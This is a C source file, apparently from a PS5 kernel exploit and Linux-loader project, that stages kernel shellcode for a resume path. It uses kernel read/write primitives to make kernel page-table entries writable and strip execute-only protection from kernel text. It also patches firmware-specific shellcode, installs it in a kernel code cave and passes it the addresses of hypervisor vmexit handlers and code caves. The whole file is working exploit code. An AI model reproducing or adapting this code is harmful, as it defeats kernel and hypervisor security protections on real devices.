#include "prepare_resume.h"
#include "../shellcode_kernel/shellcode_kernel.h"
#include "../shellcode_kernel/shellcode_kernel_args.h"
#include "../shellcode_kernel_1160/shellcode_kernel_args_validate.h"
#include "config.h"
#include "hv_defeat_13xx.h"
#include "iommu.h"
#include "loader_staging_1160.h"
#include "offsets.h"
#include "shellcode_1360.h"
#include "utils.h"
#include "../shellcode_kernel_13xx/shellcode_kernel_13xx.h"
#include "../shellcode_kernel_1160/shellcode_kernel_1160.h"
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>

static int apply_1360_dma_e820_map(void *buffer, size_t length) {
  static const struct {
    size_t offset;
    uint32_t expected;
    uint32_t replacement;
  } patches[] = {
      {0x1889, 0x3FEFC000, 0x00F00000},
      {0x18AC, 0x3FFFC000, 0x01000000},
      {0x18B7, 0x00004000, 0x3F000000},
  };
  uint8_t *code = buffer;

  for (size_t i = 0; i < sizeof(patches) / sizeof(patches[0]); i++) {
    uint32_t value;
    if (patches[i].offset > length ||
        length - patches[i].offset < sizeof(value))
      return -1;
    memcpy(&value, code + patches[i].offset, sizeof(value));
    if (value != patches[i].expected)
      return -1;
  }

  for (size_t i = 0; i < sizeof(patches) / sizeof(patches[0]); i++)
    memcpy(code + patches[i].offset, &patches[i].replacement,
           sizeof(patches[i].replacement));

  return 0;
}

// Set RW and clear XO on va's page chain, checking every write. 11.60 only.
static int page_chain_set_rw_checked_1160(uint64_t va) {
  uint64_t table_phys = cr3;

  for (int level = 0; level < 4; level++) {
    int shift = 39 - level * 9;
    uint64_t index = (va >> shift) & 0x1ff;
    uint64_t entry_va = dmap + PAGE_PA(table_phys) + index * 8;
    uint64_t entry = 0;

    if (kernel_copyout(entry_va, &entry, sizeof(entry)) != 0 || !PAGE_P(entry))
      return -1;

    uint64_t updated = entry;
    PAGE_SET_RW(updated);
    PAGE_CLEAR_XO(updated);
    if (updated != entry) {
      uint64_t observed = 0;
      if (kernel_copyin(&updated, entry_va, sizeof(updated)) != 0 ||
          kernel_copyout(entry_va, &observed, sizeof(observed)) != 0 ||
          observed != updated)
        return -1;
      entry = updated;
    }

    if (((level == 1 || level == 2) && PAGE_PS(entry)) || level == 3)
      return 0;
    table_phys = PAGE_PA(entry);
  }
  return -1;
}

/*
 * 11.60 only opens the places the handoff writes: the CFI byte the wake blob
 * patches and the code cave the resume ROP fills. Executing XOM text does not
 * need it readable or writable, so the rest of ktext is left alone.
 */
static int remove_xotext_1160(size_t wake_len) {
  if (env_offset.KERNEL_CFI_CHECK == 0 || env_offset.KERNEL_CODE_CAVE == 0 ||
      wake_len == 0 || wake_len > 0x5000)
    return -1;

  if (page_chain_set_rw_checked_1160(ktext + env_offset.KERNEL_CFI_CHECK))
    return -1;
  for (size_t offset = 0; offset < wake_len; offset += 0x1000)
    if (page_chain_set_rw_checked_1160(ktext + env_offset.KERNEL_CODE_CAVE +
                                       offset))
      return -1;
  return 0;
}

int remove_xotext(void) {
  uint64_t start = ktext;
  uint64_t end = kdata;
  int n __attribute__((unused)) = 0;

  for (uint64_t a = start; a < end; a += 0x1000) {
    page_chain_set_rw(a);
    n++;
  }
  return 0;
}

int kernel_pmap_invalidate_all(void) {
  static uint64_t two_zero_pages[PAGE_SIZE * 2] = {0};

  int pipe_fds[2];

  if (pipe2(pipe_fds, O_NONBLOCK)) {
    return -1;
  }

  if (write(pipe_fds[1], two_zero_pages, PAGE_SIZE * 2) < 0) {
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    return -1;
  }

  close(pipe_fds[1]);

  uint64_t read_fd_file_data = kernel_get_proc_file(-1, pipe_fds[0]);

  if (!INKERNEL(read_fd_file_data)) {
    close(pipe_fds[0]);
    return -1;
  }

  uint64_t read_fd_buffer;
  kernel_copyout(read_fd_file_data + 0x10, &read_fd_buffer,
                 sizeof(read_fd_buffer));

  if (!INKERNEL(read_fd_buffer)) {
    close(pipe_fds[0]);
    return -1;
  }

  if (!page_remove_global(read_fd_buffer)) {
    close(pipe_fds[0]);
    return -1;
  }

  close(pipe_fds[0]);
  return 0;
}

int prepare_resume(void **shellcode_kernel, size_t *shellcode_kernel_len) {
  if (env_offset.KERNEL_CODE_CAVE == 0) {
    printf("Error: missing code cave offset\n");
    return -1;
  }

  const uint8_t *shellcode_src = shellcode_kernel_bin;
  size_t shellcode_len = shellcode_kernel_bin_len;
  if (PS5_FW_IS_12XX(fw) || fw == 0x1300 || fw == 0x1320 || fw == 0x1340 ||
      fw == 0x1342) {
    shellcode_src = shellcode_kernel_13xx_bin;
    shellcode_len = shellcode_kernel_13xx_bin_len;
  } else if (fw == 0x1360 && linux_i.kit_type != KIT_RETAIL_PRO) {
    shellcode_src = stock_shellcode_kernel_1360;
    shellcode_len = stock_shellcode_kernel_1360_len;
  } else if (PS5_FW_IS_11XX(fw)) {
    shellcode_src = shellcode_kernel_1160_bin;
    shellcode_len = shellcode_kernel_1160_bin_len;
  }

  if ((PS5_FW_IS_12XX(fw) || fw == 0x1300 || fw == 0x1320) &&
      shellcode_len > 0x3910)
    return -1;
  if (PS5_FW_IS_11XX(fw) && shellcode_len > 0x5000)
    return -1;

  *shellcode_kernel =
      mmap(NULL, ALIGN_UP(shellcode_len, PAGE_SIZE),
           PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (*shellcode_kernel == MAP_FAILED)
    return -1;
  *shellcode_kernel_len = shellcode_len;
  memcpy(*shellcode_kernel, shellcode_src, shellcode_len);
  if (fw == 0x1360 && linux_i.kit_type != KIT_RETAIL_PRO &&
      apply_1360_dma_e820_map(*shellcode_kernel, shellcode_len)) {
    notify("13.60 DMA E820 patch did not match stock shellcode\n");
    return -1;
  }

  uint64_t args_va = prepare_sck_args();
  if (!args_va ||
      update_sck_args_ptr((uint64_t)*shellcode_kernel, args_va))
    return -1;

  // Install shellcode_kernel in kernel space.
  for (size_t i = 0; i < shellcode_len; i += PAGE_SIZE) {
    install_page_syscore(kernel_cave_shellcode + i,
                         vtophys_user((uintptr_t)*shellcode_kernel + i), 0);
  }

  if (PS5_FW_IS_11XX(fw) ? remove_xotext_1160(shellcode_len) : remove_xotext()) {
    printf("Error: could not remove xo from text\n");
    return -1;
  }

  if (kernel_pmap_invalidate_all()) {
    printf("Error: could not invalidate pmap\n");
    return -1;
  }

  return 0;
}

int update_sck_args_ptr(uint64_t shellcode, uint64_t args) {
  // Find the address 0x11AA11AA11AA11AA used as marker
  int offset = -1;
  for (uint64_t i = 0; i < 0x40; i++) {
    if (*(uint64_t *)(shellcode + i) == 0x11AA11AA11AA11AA) {
      offset = i;
      break;
    }
  }
  if (offset == -1) {
    notify("Could not find offset of args_ptr address - Aborting\n");
    return -1;
  }
  *(uint64_t *)(shellcode + offset) = args;
  return 0;
}

uint64_t prepare_sck_args(void) {
  shellcode_kernel_args args;
  memset(&args, 0, sizeof(args));
  args.fw_version = fw;
  args.ktext = ktext;
  args.kdata = kdata;
  args.dmap_base = dmap;

  args.fun_printf = ktext + env_offset.FUN_PRINTF;
  args.fun_hv_iommu_set_buffers =
      ktext + env_offset.FUN_HV_IOMMU_SET_BUFFERS;
  args.fun_hv_iommu_wait_completion =
      ktext + env_offset.FUN_HV_IOMM_WAIT_COMPLETION;
  args.fun_smp_rendezvous = ktext + env_offset.FUN_SMP_RENDEZVOUS;
  args.fun_smp_no_rendevous_barrier =
      ktext + env_offset.FUN_SMP_NO_RENDEVOUS_BARRIER;
  args.g_vbios = ktext + env_offset.G_VBIOS;

  args.fun_transmitter_control = ktext + env_offset.FUN_TRANSMITTER_CONTROL;
  args.fun_mp3_initialize = ktext + env_offset.FUN_MP3_INITIALIZE;
  args.fun_mp3_invoke = ktext + env_offset.FUN_MP3_INVOKE;

  args.iommu_softc = ktext + env_offset.IOMMU_SOFTC;

  args.kernel_uart_override = ktext + env_offset.KERNEL_UART_OVERRIDE;
  args.kernel_cfi_check = ktext + env_offset.KERNEL_CFI_CHECK;
  args.hv_handle_vmexit_pa = env_offset.HV_HANDLE_VMEXIT_PA;
  args.hv_code_cave_pa = env_offset.HV_CODE_CAVE_PA;
  if ((PS5_FW_IS_11XX(fw) || PS5_FW_IS_12XX(fw) || fw == 0x1320 ||
       fw == 0x1340 || fw == 0x1342 || fw == 0x1360) &&
      linux_i.kit_type == KIT_RETAIL_PRO) {
    uint64_t pro_base = derive_h() + HV_CODE_OFFSET_PRO;
    uint64_t hv_offset = pro_base - HV_BASE_REGULAR;
    args.hv_handle_vmexit_pa += hv_offset;
    args.hv_code_cave_pa += hv_offset;
  }

  args.linux_info_va = linux_i.linux_info;

  if (PS5_FW_IS_11XX(fw) && validate_shellcode_kernel_args_1160(&args))
    return 0;

  uint64_t args_pa = alloc_page();
  // Keep the args page off the page under the #SX stack, which the wake stack
  // reaches past 0x1040 bytes. Pages taken here stay allocated.
  while (PS5_FW_IS_11XX(fw) && args_pa && pa_under_sx_stack_1160(args_pa))
    args_pa = alloc_page();
  if (!args_pa)
    return 0;

  uint64_t args_cave = pa_to_dmap(args_pa);
  shellcode_kernel_args readback = {0};
  if (kernel_copyin(&args, args_cave, sizeof(args)) ||
      kernel_copyout((intptr_t)args_cave, &readback, sizeof(readback)) ||
      memcmp(&args, &readback, sizeof(args)))
    return 0;
  if (PS5_FW_IS_11XX(fw) && validate_shellcode_kernel_args_1160(&readback))
    return 0;

  return args_cave;
}
